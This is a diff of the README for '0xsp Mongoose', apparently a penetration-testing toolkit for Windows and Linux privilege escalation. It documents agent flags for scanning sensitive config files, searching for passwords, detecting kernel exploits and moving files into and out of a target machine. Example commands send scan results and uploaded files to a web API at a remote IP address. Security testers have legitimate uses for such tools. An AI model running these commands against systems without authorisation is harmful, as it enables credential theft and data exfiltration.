@@ -6,7 +6,7 @@
 
 # 0xsp Mongoose Linux / Windows Privilege Escalation intelligent Enumeration Toolkit
 
-# windows Version WILL BE RELEASED ON 18 August 
+
 using 0xsp mongoose you will be able to scan targeted operating system for any possible way for privilege escalation attacks,starting from 
 collecting information stage unitl reporting information through 0xsp Web Application API . 
 
@@ -26,18 +26,20 @@ while executing `Agent` on targeted system with all required parameters . user i
 2. ./agent.exe -h (display help instructions) 
 
 ```
--s --Enumerate Active Windows Services , Drivers ..etc 
--u --Getting information about Users, Groups , Roles , Releated information 
--c --Search For Sensitive Config files & private Stuff 
--n --retrieve Network information , interfaces ..etc 
--w --Enumerate For writable Directories , Access Permission Check , Modifid Permissions 
--i --Enumerate Windows System information , Sessions , Releated information 
--l --search in any file extension by Specific Keywords 
--o --connect to 0xsp Web application API 
--p --Enumerate Installed Softwares , Running Processes 
--e --Kernel inspection Tool, Search for Windows Local Exploits 
--x --Secret Key to Authorize your connection with 0xsp 
--d --Download Files Directly into Target Machine . 
+-s --Enumerate Active Windows Services , Drivers  ..etc .
+-u --Getting information about Users , groups , Roles , Releated information .
+-c --Search for Senstive Config files Accessible & Private stuff .
+-n --Retrieve Network information,interfaces ...etc .
+-w --Enumerate for Writeable Directories , Access Permission Check , Modified Permissions.
+-i --Enumerate Windows System information , Sessions , Releated information.
+-l --Search in Any File by Specific Keywork , ex : agent.exe -l c:\ password *.config.
+-o --Connect to 0xsp Mongoose Web Application API.
+-p --Enumerate installed Softwares , Running Processes, Tasks .
+-e --Kernel inspection Tool, it will help to search through tool databases for windows kernel vulnerabilities
+-x --Secret Key to authorize your connection with WebApp.
+-d --Download Files directly into Target Machine .
+-t --Upload Files From Target Machine into Mongoose Web Application API. [agent.exe -t filename api secretkey]
+-m --Run All Known Scan Types together .
 
 
 ```
@@ -61,10 +63,11 @@ while executing `Agent` on targeted system with all required parameters . user i
 ### Examples With WebApi  
 
 ```
-./agent -c -o localhost -x 0xsp { enumerate for Senstive Configs files & Private Stuff} 
-./agent -e -o localhost -x 0xsp { intelligent Exploits Detector Must Match Windows Arch 64 or 32 }
-./agent -c -e localhost -x 0sxp { will run two scans together and send found results directly }
-./agent -m -o 10.10.13.1 -x 0xsp { RUN all Scans together and export it to Web API} 
+agent.exe -c -o localhost -x 0xsp { enumerate for Senstive Configs files & Private Stuff} 
+agent.exe -e -o localhost -x 0xsp { intelligent Exploits Detector Must Match Windows Arch 64 or 32 }
+agent.exe -c -o localhost -x 0sxp { will run two scans together and send found results directly }
+agent.exe -t filename.zip localhost 0xsp { will upload filename.zip into download center}
+agent.exe -m -o 10.10.13.1 -x 0xsp { RUN all Scans together and export it to Web API} 
 ```
 
 ### Examples Without WebApi
